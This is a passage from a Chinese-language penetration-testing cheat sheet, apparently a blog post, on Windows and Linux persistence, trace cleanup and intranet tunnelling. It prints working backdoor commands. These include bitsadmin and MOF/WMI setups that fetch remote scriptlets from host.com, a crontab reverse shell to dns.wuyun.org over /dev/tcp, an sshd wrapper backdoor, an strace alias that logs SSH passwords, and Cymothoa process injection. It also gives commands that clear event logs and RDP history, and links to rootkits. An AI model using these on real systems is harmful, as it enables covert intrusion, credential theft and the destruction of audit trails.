<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure>
<h5 id="7-services"><a class="markdownIt-Anchor" href="#7-services">#</a> 7、Services</h5>
<p>创建服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create [ServerName] binPath= BinaryPathName</span><br></pre></td></tr></table></figure>
<h5 id="8-browser-helper-objects"><a class="markdownIt-Anchor" href="#8-browser-helper-objects">#</a> 8、Browser Helper Objects</h5>
<p>本质上是 Internet Explorer 启动时加载的 DLL 模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure>
<h5 id="9-appinit_dlls"><a class="markdownIt-Anchor" href="#9-appinit_dlls">#</a> 9、AppInit_DLLs</h5>
<p>加载 User32.dll 会加载的 DLL</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure>
<h5 id="10-文件关联"><a class="markdownIt-Anchor" href="#10-文件关联">#</a> 10、文件关联</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Classes</span><br><span class="line">HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure>
<h5 id="11-bitsadmin"><a class="markdownIt-Anchor" href="#11-bitsadmin">#</a> 11、<a target="_blank" rel="noopener" href="http://www.liuhaihua.cn/archives/357579.html">bitsadmin</a></h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create backdoor</span><br><span class="line">bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe</span><br><span class="line">bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://host.com/calc.sct scrobj.dll&quot;</span><br><span class="line">bitsadmin /Resume backdoor</span><br></pre></td></tr></table></figure>
<h5 id="12-mof"><a class="markdownIt-Anchor" href="#12-mof">#</a> 12、<a target="_blank" rel="noopener" href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html">mof</a></h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name = &quot;filtP1&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 1&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consP1&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText = &quot;GetObject(\&quot;script:https://host.com/test\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>管理员执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mofcomp test.mof</span><br></pre></td></tr></table></figure>
<h5 id="13-wmi"><a class="markdownIt-Anchor" href="#13-wmi">#</a> 13、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe">wmi</a></h5>
<p>每隔 60 秒执行一次 notepad.exe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;</span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate=&quot;C:\Windows\System32\notepad.exe&quot;</span><br><span class="line"></span><br><span class="line">wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;BotFilter82\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;BotConsumer23\&quot;&quot;</span><br></pre></td></tr></table></figure>
<h5 id="14-userland-persistence-with-scheduled-tasks"><a class="markdownIt-Anchor" href="#14-userland-persistence-with-scheduled-tasks">#</a> 14、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Userland-registry-hijacking">Userland Persistence With Scheduled Tasks</a></h5>
<p>劫持计划任务 UserTask，在系统启动时加载 dll</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function Invoke-ScheduledTaskComHandlerUserTask</span><br><span class="line">&#123;</span><br><span class="line">[<span class="meta">CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#x27;Medium&#x27;)</span>]</span><br><span class="line">Param (</span><br><span class="line">[<span class="meta">Parameter(Mandatory = $True)</span>]</span><br><span class="line">[<span class="meta">ValidateNotNullOrEmpty()</span>]</span><br><span class="line">[<span class="meta">String</span>]</span><br><span class="line">$Command,</span><br><span class="line"></span><br><span class="line">[<span class="meta">Switch</span>]</span><br><span class="line">$Force</span><br><span class="line">)</span><br><span class="line">$ScheduledTaskCommandPath = <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;</span></span><br><span class="line"><span class="keyword">if</span> ($Force -<span class="keyword">or</span> ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name <span class="string">&#x27;(default)&#x27;</span> -ErrorAction SilentlyContinue) -eq $<span class="literal">null</span>))&#123;</span><br><span class="line">New-Item $ScheduledTaskCommandPath -Force |</span><br><span class="line">New-ItemProperty -Name <span class="string">&#x27;(Default)&#x27;</span> -Value $Command -PropertyType <span class="built_in">string</span> -Force | Out-Null</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Write-Verbose <span class="string">&quot;Key already exists, consider using -Force&quot;</span></span><br><span class="line">exit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Test-Path $ScheduledTaskCommandPath) &#123;</span><br><span class="line">Write-Verbose <span class="string">&quot;Created registry entries to hijack the UserTask&quot;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Write-Warning <span class="string">&quot;Failed to create registry key, exiting&quot;</span></span><br><span class="line">exit</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">Invoke-ScheduledTaskComHandlerUserTask -Command <span class="string">&quot;C:\test\testmsg.dll&quot;</span> -Verbose</span><br></pre></td></tr></table></figure>
<h5 id="15-netsh"><a class="markdownIt-Anchor" href="#15-netsh">#</a> 15、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Netsh-persistence">Netsh</a></h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper c:\test\netshtest.dll</span><br></pre></td></tr></table></figure>
<p>后门触发：每次调用 netsh</p>
<blockquote>
<p>dll 编写:<a target="_blank" rel="noopener" href="https://github.com/outflanknl/NetshHelperBeacon">https://github.com/outflanknl/NetshHelperBeacon</a></p>
</blockquote>
<h5 id="16-shim"><a class="markdownIt-Anchor" href="#16-shim">#</a> 16、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims">Shim</a></h5>
<p>常用方式： InjectDll RedirectShortcut RedirectEXE</p>
<h5 id="17-dll劫持"><a class="markdownIt-Anchor" href="#17-dll劫持">#</a> 17、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95">DLL 劫持</a></h5>
<p>通过 Rattler 自动枚举进程，检测是否存在可用 dll 劫持利用的进程 使用：Procmon 半自动测试更精准，常规生成的 dll 会导致程序执行报错或中断，使用 AheadLib 配合生成 dll 劫持利用源码不会影响程序执行</p>
<p>工具：<a target="_blank" rel="noopener" href="https://github.com/sensepost/rattler">https://github.com/sensepost/rattler</a></p>
<p>工具：<a target="_blank" rel="noopener" href="https://github.com/Yonsm/AheadLib">https://github.com/Yonsm/AheadLib</a></p>
<p>dll 劫持不多说</p>
<h5 id="18-doubleagent"><a class="markdownIt-Anchor" href="#18-doubleagent">#</a> 18、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)">DoubleAgent</a></h5>
<p>编写自定义 Verifier provider DLL 通过 Application Verifier 进行安装 注入到目标进程执行 payload 每当目标进程启动，均会执行 payload，相当于一个自启动的方式 POC : <a target="_blank" rel="noopener" href="https://github.com/Cybellum/DoubleAgent">https://github.com/Cybellum/DoubleAgent</a></p>
<h5 id="19-waitforexe"><a class="markdownIt-Anchor" href="#19-waitforexe">#</a> 19、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence">waitfor.exe</a></h5>
<p>不支持自启动，但可远程主动激活，后台进程显示为 waitfor.exe POC : <a target="_blank" rel="noopener" href="https://github.com/3gstudent/Waitfor-Persistence">https://github.com/3gstudent/Waitfor-Persistence</a></p>
<h5 id="20-appdomainmanager"><a class="markdownIt-Anchor" href="#20-appdomainmanager">#</a> 20、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence">AppDomainManager</a></h5>
<p>针对.Net 程序，通过修改 AppDomainManager 能够劫持.Net 程序的启动过程。如果劫持了系统常见.Net 程序如 powershell.exe 的启动过程，向其添加 payload，就能实现一种被动的后门触发机制</p>
<h5 id="21-office"><a class="markdownIt-Anchor" href="#21-office">#</a> 21、Office</h5>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8">劫持 Office 软件的特定功能</a>：通过 dll 劫持，在 Office 软件执行特定功能时触发后门 <a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8">利用 VSTO 实现的 office 后门</a> <a target="_blank" rel="noopener" href="https://github.com/3gstudent/Office-Persistence">Office 加载项</a></p>
<ul>
<li>Word WLL</li>
<li>Excel XLL</li>
<li>Excel VBA add-ins</li>
<li>PowerPoint VBA add-ins</li>
</ul>
<blockquote>
<p>参考 1 ：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-Office-to-maintain-persistence">https://3gstudent.github.io/Use-Office-to-maintain-persistence</a></p>
</blockquote>
<blockquote>
<p>参考 2 ：<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Office-Persistence-on-x64-operating-system">https://3gstudent.github.io/Office-Persistence-on-x64-operating-system</a></p>
</blockquote>
<h5 id="22-clr"><a class="markdownIt-Anchor" href="#22-clr">#</a> 22、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-CLR-to-maintain-persistence">CLR</a></h5>
<p>无需管理员权限的后门，并能够劫持所有.Net 程序 POC:<a target="_blank" rel="noopener" href="https://github.com/3gstudent/CLR-Injection">https://github.com/3gstudent/CLR-Injection</a></p>
<h5 id="23-msdtc"><a class="markdownIt-Anchor" href="#23-msdtc">#</a> 23、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-msdtc-to-maintain-persistence">msdtc</a></h5>
<p>利用 MSDTC 服务加载 dll，实现自启动，并绕过 Autoruns 对启动项的检测 利用：向 % windir%\system32\ 目录添加 dll 并重命名为 oci.dll</p>
<h5 id="24-hijack-caccpropservicesclass-and-mmdeviceenumerato"><a class="markdownIt-Anchor" href="#24-hijack-caccpropservicesclass-and-mmdeviceenumerato">#</a> 24、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator">Hijack CAccPropServicesClass and MMDeviceEnumerato</a></h5>
<p>利用 COM 组件，不需要重启系统，不需要管理员权限 通过修改注册表实现 POC：<a target="_blank" rel="noopener" href="https://github.com/3gstudent/COM-Object-hijacking">https://github.com/3gstudent/COM-Object-hijacking</a></p>
<h5 id="25-hijack-explorerexe"><a class="markdownIt-Anchor" href="#25-hijack-explorerexe">#</a> 25、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe">Hijack explorer.exe</a></h5>
<p>COM 组件劫持，不需要重启系统，不需要管理员权限 通过修改注册表实现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</span><br><span class="line">HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span><br></pre></td></tr></table></figure>
<h5 id="26-windows-fax-dll-injection"><a class="markdownIt-Anchor" href="#26-windows-fax-dll-injection">#</a> 26、Windows FAX DLL Injection</h5>
<p>通过 DLL 劫持，劫持 Explorer.exe 对 <code>fxsst.dll</code>  的加载 Explorer.exe 在启动时会加载 <code>c:\Windows\System32\fxsst.dll</code>  (服务默认开启，用于传真服务) 将 payload.dll 保存在 <code>c:\Windows\fxsst.dll</code> ，能够实现 dll 劫持，劫持 Explorer.exe 对 <code>fxsst.dll</code>  的加载</p>
<h5 id="27-特殊注册表键值"><a class="markdownIt-Anchor" href="#27-特殊注册表键值">#</a> 27、特殊注册表键值</h5>
<p>在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取 (使用 Win32 API)，但系统能够执行 (使用 Native API)。</p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA">《渗透技巧 ——&quot;隐藏&quot; 注册表的创建》</a></p>
<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95">《渗透技巧 ——&quot;隐藏&quot; 注册表的更多测试》</a></p>
<h5 id="28-快捷方式后门"><a class="markdownIt-Anchor" href="#28-快捷方式后门">#</a> 28、快捷方式后门</h5>
<p>替换我的电脑快捷方式启动参数 POC : <a target="_blank" rel="noopener" href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p>
<h5 id="29-logon-scripts"><a class="markdownIt-Anchor" href="#29-logon-scripts">#</a> 29、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence">Logon Scripts</a></h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure>
<h5 id="30-password-filter-dll"><a class="markdownIt-Anchor" href="#30-password-filter-dll">#</a> 30、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8">Password Filter DLL</a></h5>
<h5 id="31-利用bho实现ie浏览器劫持"><a class="markdownIt-Anchor" href="#31-利用bho实现ie浏览器劫持">#</a> 31、<a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">利用 BHO 实现 IE 浏览器劫持</a></h5>
<h2 id="linux-4"><a class="markdownIt-Anchor" href="#linux-4">#</a> Linux</h2>
<h5 id="crontab"><a class="markdownIt-Anchor" href="#crontab">#</a> crontab</h5>
<p>每 60 分钟反弹一次 shell 给 dns.wuyun.org 的 53 端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
<h5 id="硬链接sshd"><a class="markdownIt-Anchor" href="#硬链接sshd">#</a> 硬链接 sshd</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;</span><br></pre></td></tr></table></figure>
<p>链接：ssh <a href="mailto:root@192.168.206.142">root@192.168.206.142</a> -p 2333</p>
<h5 id="ssh-server-wrapper"><a class="markdownIt-Anchor" href="#ssh-server-wrapper">#</a> SSH Server wrapper</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">cd /usr/sbin</span><br><span class="line">mv sshd ../bin</span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd</span><br><span class="line">echo &#x27;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">//不用重启也行</span><br><span class="line">/etc/init.d/sshd restart</span><br><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport=13377</span><br></pre></td></tr></table></figure>
<h5 id="ssh-keylogger"><a class="markdownIt-Anchor" href="#ssh-keylogger">#</a> SSH keylogger</h5>
<p>vim 当前用户下的.bashrc 文件，末尾添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">alias ssh=&#x27;strace -o /tmp/sshpwd-`date &#x27;+%d%h%m%s&#x27;`.log -e read,write,connect -s2048 ssh&#x27;</span><br></pre></td></tr></table></figure>
<p>source .bashrc</p>
<h5 id="cymothoa_进程注入backdoor"><a class="markdownIt-Anchor" href="#cymothoa_进程注入backdoor">#</a> Cymothoa_进程注入 backdoor</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./cymothoa -p 2270 -s 1 -y 7777</span><br><span class="line">nc -vv ip 7777</span><br></pre></td></tr></table></figure>
<h5 id="rootkit"><a class="markdownIt-Anchor" href="#rootkit">#</a> rootkit</h5>
<ul>
<li><a target="_blank" rel="noopener" href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz">openssh_rootkit</a></li>
<li><a target="_blank" rel="noopener" href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz">Kbeast_rootkit</a></li>
<li>Mafix + Suterusu rootkit</li>
</ul>
<h5 id="tools"><a class="markdownIt-Anchor" href="#tools">#</a> Tools</h5>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Screetsec/Vegile">Vegile</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/icco/backdoor">backdoor</a></li>
</ul>
<h1 id="14痕迹清理"><a class="markdownIt-Anchor" href="#14痕迹清理">#</a> 14. 痕迹清理</h1>
<h3 id="windows日志清除"><a class="markdownIt-Anchor" href="#windows日志清除">#</a> <a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87">Windows 日志清除</a></h3>
<p>获取日志分类列表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el &gt;1.txt</span><br></pre></td></tr></table></figure>
<p>获取单个日志类别的统计信息： eg.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil gli &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<p>回显：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">creationTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</span><br><span class="line">fileSize: 1118208</span><br><span class="line">attributes: 32</span><br><span class="line">numberOfLogRecords: 1228</span><br><span class="line">oldestRecordNumber: 1</span><br></pre></td></tr></table></figure>
<p>查看指定日志的具体内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe /f:text &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<p>删除单个日志类别的所有信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure>
<h3 id="破坏windows日志记录功能"><a class="markdownIt-Anchor" href="#破坏windows日志记录功能">#</a> 破坏 Windows 日志记录功能</h3>
<p>利用工具</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/hlldz/Invoke-Phant0m">Invoke-Phant0m</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/Windwos-EventLog-Bypass">Windwos-EventLog-Bypass</a></li>
</ul>
<h3 id="metasploit"><a class="markdownIt-Anchor" href="#metasploit">#</a> Metasploit</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run clearlogs </span><br><span class="line">clearev </span><br></pre></td></tr></table></figure>
<h3 id="3389登陆记录清除"><a class="markdownIt-Anchor" href="#3389登陆记录清除">#</a> 3389 登陆记录清除</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure>
<h1 id="15内网穿透"><a class="markdownIt-Anchor" href="#15内网穿透">#</a> 15. 内网穿透</h1>
<p><strong>区分正向代理与反向代理</strong></p>
<p>A----b----C</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A去请求C,B作为代理，代替A去访问C，并将返回的结果转发给A   那么B就是正向代理</span><br><span class="line">B主动与A的8888端口连接，并将A:8888的访问转发到C:80上去，并将结果转发给A,则B是反向代理</span><br><span class="line">反向代理优势: 当AB之间有防火墙，不允许A连B,但是允许B连A</span><br></pre></td></tr></table></figure>
<h4 id="0x01-场景与思路分析"><a class="markdownIt-Anchor" href="#0x01-场景与思路分析">#</a> 0x01 场景与思路分析</h4>
<h6 id="场景一内网防火墙对出口流量没有任何端口限制"><a class="markdownIt-Anchor" href="#场景一内网防火墙对出口流量没有任何端口限制">#</a> 场景一：内网防火墙对出口流量没有任何端口限制</h6>
<p>思路 <strong>：由于防火墙对出口流量没有任何端口限制，我们的可选择的方案非常灵活，如：反弹 shell</strong></p>
<h6 id="场景二内网防火墙仅允许内网主机访问外网的特定端口如80-443"><a class="markdownIt-Anchor" href="#场景二内网防火墙仅允许内网主机访问外网的特定端口如80-443">#</a> 场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）</h6>
<p>思路：由于防火墙仅允许部分特定外网端口可以访问，思路一仍然是反弹 shell 只不过目标端口改成特定端口即可；思路二则是端口转发，将内网主机的某些服务的端口转发到外网攻击主机上的防火墙允许的特定端口上，再通过连接外网主机上的本地端口来访问内网服务</p>
<p><strong>方法一：反弹 shell 可参考场景一中的方法，仅需修改目标端口为防火墙允许的特定端口即可</strong></p>
<p><strong>方法二：端口转发</strong></p>
<p><strong>方法三：SSH 的动态端口转发配合 proxychains 来代理所有流量进一步渗透内网</strong></p>
<p>1. 在内网主机上执行</p>
